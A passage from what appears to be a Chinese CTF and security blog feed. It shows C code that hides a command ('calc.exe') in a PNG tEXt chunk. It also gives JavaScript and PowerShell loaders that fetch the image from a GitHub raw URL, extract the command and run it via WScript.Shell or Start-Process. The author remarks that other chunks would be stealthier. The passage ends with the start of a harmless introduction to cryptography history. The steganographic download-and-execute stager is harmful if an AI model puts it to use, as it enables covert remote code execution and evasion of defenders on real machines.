class="keyword">unsigned</span> <span class="keyword">char</span> IEND[<span class="number">12</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x44</span>,<span class="number">0xae</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x82</span>&#125;;        </div><div class="line">           <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\0.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                       return0;  </div><div class="line">           <span class="keyword">if</span>((fpnew=fopen(<span class="string">"c:\\test\\new.png"</span>,<span class="string">"wb"</span>))==<span class="literal">NULL</span>)</div><div class="line">                       return0;  </div><div class="line">           fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">           len=ftell(fp);</div><div class="line">           buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">           fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">           fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">           <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">           <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">           fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">           ChunkOffset=<span class="number">8</span>;</div><div class="line">           i=<span class="number">0</span>;</div><div class="line">           fwrite(Signature,<span class="number">8</span>,<span class="number">1</span>,fpnew);</div><div class="line">           <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">           &#123;</div><div class="line">                       i++;</div><div class="line">                       j=<span class="number">0</span>;</div><div class="line">                       <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                       fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                      fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                       ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                       fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                       <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                       &#123;           </div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                                   fwrite(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fpnew);</div><div class="line">                       &#125;</div><div class="line">                       <span class="keyword">else</span></div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                                   fseek(fpnew,<span class="number">-4</span>,SEEK_CUR);</div><div class="line">                                   j=<span class="number">1</span>;</div><div class="line">                       &#125;</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"  ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ChunkLen:%10d             \n"</span>,ChunkLen);</div><div class="line">                       crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                       fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                       ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32:%08X                    "</span>,ChunkCRC32);</div><div class="line">                       <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                       <span class="keyword">else</span></div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                                   <span class="keyword">if</span>(j==<span class="number">0</span>)</div><div class="line">                                               fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                       &#125;</div><div class="line">                       ChunkLen=ftell(fp);</div><div class="line">                       <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                       </div><div class="line">                                   <span class="keyword">break</span>;</div><div class="line">                       &#125;</div><div class="line">           &#125;</div><div class="line">           fwrite(IEND,<span class="number">12</span>,<span class="number">1</span>,fpnew);</div><div class="line">           fclose(fp);</div><div class="line">           fclose(fpnew);</div><div class="line">           return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="0x05-写入Payload"><a href="#0x05-写入Payload" class="headerlink" title="0x05-写入Payload"></a>0x05-写入Payload</h2><p>实例：按照辅助数据块的格式写入Payload</p>
<p>写入的Payload为:calc.exe</p>
<p>辅助数据块设置为：tEXt(文本信息数据块)</p>
<p>对应的完整数据块结构如下：</p>
<p>Length: 0000 00 08</p>
<p>Chunk Type Code： 74 45 58 74</p>
<p>Chunk Data：63 61 6c 63 2e 65 78 65</p>
<p>CRC：fa c4 08 76</p>
<p>写入的十六进制数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00 00 00 08 74 45 58 74 63 61 6c 63 2e 6578 65 fa c4 08 76</div></pre></td></tr></table></figure>
<p>注： 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Friend插入数据，如图</p>
<p>保存后，不影响PNG文件浏览</p>
<ol>
<li>程序实现</li>
</ol>
<p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>
<p>保存为addpayload.cpp,完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                        Crc= i;        </div><div class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                    <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                                Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                    <span class="keyword">else</span>       </div><div class="line">                                                Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                        &#125;        </div><div class="line">                        Crc32Table[i]= Crc;        </div><div class="line">            &#125;        </div><div class="line">            Crc=<span class="number">0xffffffff</span>;        </div><div class="line">            <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line">            &#125;</div><div class="line">            Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">            returnCrc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">convertStrToUnChar</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">unsigned</span> <span class="keyword">char</span>* UnChar)</span>  </span></div><div class="line">&#123;  </div><div class="line">            inti = <span class="built_in">strlen</span>(str), j = <span class="number">0</span>, counter = <span class="number">0</span>;  </div><div class="line">            charc[<span class="number">2</span>];  </div><div class="line">            unsignedint bytes[<span class="number">2</span>];  </div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j += <span class="number">2</span>)   </div><div class="line">            &#123;  </div><div class="line">                        <span class="keyword">if</span>(<span class="number">0</span>== j % <span class="number">2</span>)  </div><div class="line">                        &#123;  </div><div class="line">                                    c[<span class="number">0</span>]= str[j];  </div><div class="line">                                    c[<span class="number">1</span>]= str[j + <span class="number">1</span>];  </div><div class="line">                                    <span class="built_in">sscanf</span>(c,<span class="string">"%02x"</span> , &amp;bytes[<span class="number">0</span>]);  </div><div class="line">                                    UnChar[counter]= bytes[<span class="number">0</span>];  </div><div class="line">                                    counter++;  </div><div class="line">                        &#125;  </div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">return</span>;  </div><div class="line">&#125;    </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddPayload</span><span class="params">(FILE *fp)</span></span></div><div class="line">&#123;</div><div class="line">            <span class="keyword">char</span>*Payload=<span class="string">"calc.exe"</span>;</div><div class="line">            unsignedchar *buf;</div><div class="line">            intlen;</div><div class="line">            intcrc32;</div><div class="line">            len=<span class="built_in">strlen</span>(Payload); </div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len+<span class="number">12</span>];</div><div class="line">            buf[<span class="number">0</span>]=len&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">1</span>]=len&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">2</span>]=len&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">3</span>]=len&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">4</span>]=<span class="string">'t'</span>;</div><div class="line">            buf[<span class="number">5</span>]=<span class="string">'E'</span>;</div><div class="line">            buf[<span class="number">6</span>]=<span class="string">'X'</span>;</div><div class="line">            buf[<span class="number">7</span>]=<span class="string">'t'</span>;</div><div class="line">            <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;len;j++)</div><div class="line">                        buf[j+<span class="number">8</span>]=Payload[j];</div><div class="line">            buf[len+<span class="number">8</span>]=<span class="number">0XFA</span>;</div><div class="line">            buf[len+<span class="number">9</span>]=<span class="number">0XC4</span>;</div><div class="line">            buf[len+<span class="number">10</span>]=<span class="number">0X08</span>;</div><div class="line">            buf[len+<span class="number">11</span>]=<span class="number">0X76</span>;</div><div class="line">            fwrite(buf,len+<span class="number">12</span>,<span class="number">1</span>,fp);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE*fp,*fpnew;   </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> Signature[<span class="number">8</span>]=&#123;<span class="number">0x89</span>,<span class="number">0x50</span>,<span class="number">0x4e</span>,<span class="number">0x47</span>,<span class="number">0x0d</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span>,<span class="number">0x0a</span>&#125;;          </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> IEND[<span class="number">12</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x44</span>,<span class="number">0xae</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x82</span>&#125;;         </div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;  </div><div class="line">            <span class="keyword">if</span>((fpnew=fopen(<span class="string">"c:\\test\\new.png"</span>,<span class="string">"wb"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;  </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            len=ftell(fp);</div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">            fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">            ChunkOffset=<span class="number">8</span>;</div><div class="line">            i=<span class="number">0</span>;</div><div class="line">            fwrite(Signature,<span class="number">8</span>,<span class="number">1</span>,fpnew);</div><div class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                        i++;</div><div class="line">                        j=<span class="number">0</span>;</div><div class="line">                        <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                        ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                        <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                        &#123;           </div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                                    fwrite(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fpnew);</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                                    fseek(fpnew,<span class="number">-4</span>,SEEK_CUR);</div><div class="line">                                    j=<span class="number">1</span>;</div><div class="line">                        &#125;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkLen: %10d              \n"</span>,ChunkLen);</div><div class="line">                        crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);</div><div class="line">                        <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                                    <span class="keyword">if</span>(j==<span class="number">0</span>)</div><div class="line">                                                fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                        &#125;</div><div class="line">                        ChunkLen=ftell(fp);</div><div class="line">                        <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                        </div><div class="line">                                    <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">            &#125;</div><div class="line">            AddPayload(fpnew);</div><div class="line">            fwrite(IEND,<span class="number">12</span>,<span class="number">1</span>,fpnew);</div><div class="line">            fclose(fp);</div><div class="line">            fclose(fpnew);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用check.cpp对其进行校验，如图，校验成功</p>
<h2 id="0x06-读取payload并执行"><a href="#0x06-读取payload并执行" class="headerlink" title="0x06-读取payload并执行"></a>0x06-读取payload并执行</h2><p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
<ol>
<li>javascript</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">h = newActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</div><div class="line">h.SetTimeouts(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">h.Open(<span class="string">"GET"</span>,<span class="string">"https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png"</span>,<span class="literal">false</span>);</div><div class="line">h.Send();</div><div class="line">Data = h.ResponseText;</div><div class="line">x=Data.indexOf(<span class="string">"tEXt"</span>);</div><div class="line">y=Data.indexOf(<span class="string">"IEND"</span>);</div><div class="line">str=Data.substring(x+<span class="number">4</span>,y<span class="number">-8</span>);</div><div class="line">newActiveXObject(<span class="string">"WScript.Shell"</span>).Run(str);</div></pre></td></tr></table></figure>
<ol>
<li>powershell</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$url</span> = <span class="string">'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'</span></div><div class="line"><span class="variable">$request</span> = <span class="built_in">New-Object</span> System.Net.WebCLient</div><div class="line"><span class="variable">$bytes</span> = <span class="variable">$request</span>.DownloadString(<span class="variable">$url</span>)</div><div class="line"><span class="variable">$x</span>=<span class="variable">$bytes</span>.indexof(<span class="string">"tEXt"</span>)</div><div class="line"><span class="variable">$y</span>=<span class="variable">$bytes</span>.indexof(<span class="string">"IEND"</span>)</div><div class="line"><span class="variable">$str</span>=<span class="variable">$bytes</span>.Substring(<span class="variable">$x</span>+<span class="number">4</span>,<span class="variable">$y</span>-<span class="variable">$x</span>-<span class="number">12</span>)</div><div class="line"><span class="built_in">Start-Process</span> -FilePath <span class="variable">$str</span></div></pre></td></tr></table></figure>
<p>注:这里给出两种方法，仅作演示</p>
]]></content>
      
        <categories>
            
            <category> 文件格式 数据隐藏 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-密码学]]></title>
      <url>/2017/10/28/CTF-%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      <content type="html"><![CDATA[<p>由于密码学在CTF的各个领域都有广泛的应用，尤其是在隐写术和安全杂项中尤为突出，除此之外，密码学也是CTF中一个单独的领域，今天就来专门的去了解一下密码学。(挣脱栅栏的束缚、从维吉尼亚的囚禁中获得重生)</p>
<a id="more"></a>
<h2 id="密码学概述与发展历程"><a href="#密码学概述与发展历程" class="headerlink" title="密码学概述与发展历程"></a>密码学概述与发展历程</h2><h3 id="古典密码的璀璨"><a href="#古典密码的璀璨" class="headerlink" title="古典密码的璀璨"></a>古典密码的璀璨</h3><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%881.10.06.png" alt="屏幕快照 2017-10-27 下午1.10.06.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午1.10.06.png</p>
            </figure>
<p>看到这张图大家就可能猜到这是爱丽丝梦游仙境(不知道的百度，这可是经典) ，今天通过一个全新的解释去描述它：</p>
<ol>
<li>爱丽丝使用纸飞机告诉兔子，红皇后要对他不利</li>
<li>红皇后截取了纸飞机，发现了这条消息并篡改之为原地别动</li>
<li>兔子收到篡改的消息最后为红皇后所害</li>
</ol>
<p>通过这个例子我们可以看到，如果爱丽丝和兔子之间使用只有她们知道的语言交流的话，那么这样的悲剧就不会发生了，这就是密码学的作用所在了，只有通信双方（或者多方）才会知道通信的具体内容。</p>
<p>密码学从古代时期就已经得到了发展，在军事、文化领域等得到了广泛的应用（<a href="https://baike.baidu.com/item/%E8%B4%B9%E6%96%AF%E6%89%98%E6%96%AF%E5%9C%86%E7%9B%98" target="_blank" rel="external">菲斯托斯圆盘</a>、<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%A3%92" target="_blank" rel="external">斯巴达棒</a>）：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%881.21.30.png" alt="屏幕快照 2017-10-27 下午1.21.30.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午1.21.30.png</p>
            </figure>
<p>在中国的古代也有类似的例子，比如说藏头诗就是其中的一种，这既可以称作隐写术也可以称作古典密码的起源：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%886.07.35.png" alt="屏幕快照 2017-10-27 下午6.07.35.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午6.07.35.png</p>
            </figure>
<h4 id="近代密码的发展"><a href="#近代密码的发展" class="headerlink" title="近代密码的发展"></a>近代密码的发展</h4><p>可以说战争虽然给人类带来了许多的痛苦，但同时人类的技术也得到了飞速的发展,在过去的时间里，我们一直采取的都是手工加密的模式，直到<a href="https://baike.baidu.com/item/%E6%81%A9%E5%B0%BC%E6%A0%BC%E7%8E%9B%E5%AF%86%E7%A0%81%E6%9C%BA" target="_blank" rel="external">恩尼格玛机</a>（1920年早期被使用于商业，在二战中德国大放光芒）的出现，才改变了这一状况：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%882.58.32.png" alt="屏幕快照 2017-10-27 下午2.58.32.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午2.58.32.png</p>
            </figure>
<p>正是因为这个机械密码机德军在二战时期才成为了通信强国，还有一点不得不提的就是降服恩尼格玛机的图灵炸弹，我们都知道图灵被称作计算机之父，因为他的理论才奠定了现代计算机的基础，在当时为了对付德军的恩尼格玛机，图灵制作了图灵炸弹来破解德军的密文，从下图中可以看到齿轮数远多于德军的机械密码机：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%885.46.13.png" alt="屏幕快照 2017-10-27 下午5.46.13.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午5.46.13.png</p>
            </figure>
<p>之后在二十世纪四十年代美国终于造出了第一台计算机，并凭借其精密的计算使日本在中途岛海战中一败涂地，从此密码学也迈入了一个新的领域。人们可以使用更加复杂的加密方式了。同时也因为军事机密对于其要求很高，所以密码学在战争中得到了飞速的发展。</p>
<h3 id="出现公钥密码学"><a href="#出现公钥密码学" class="headerlink" title="出现公钥密码学"></a>出现公钥密码学</h3><p>1976年Diffie$Hellman提出了不对称密码（公钥密码）1977年Rivest,Shamir&amp;Aleman提出了RSA公钥算法，1977年DES正式成为了标准，纵观密码学的发展，我们可以发现：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-27%20%E4%B8%8B%E5%8D%885.58.05.png" alt="屏幕快照 2017-10-27 下午5.58.05.png" title="" class="">
                <p>屏幕快照 2017-10-27 下午5.58.05.png</p>
            </figure>
<h3 id="密码学基本概念"><a href="#密码学基本概念" class="headerlink" title="密码学基本概念"></a>密码学基本概念</h3><ul>
<li>明文（消息）（PlainText）:被隐蔽消息。</li>
<li>密文（Ciphertext）或密报（Cryptogram）:明文经密码变换成的一种隐蔽形式</li>
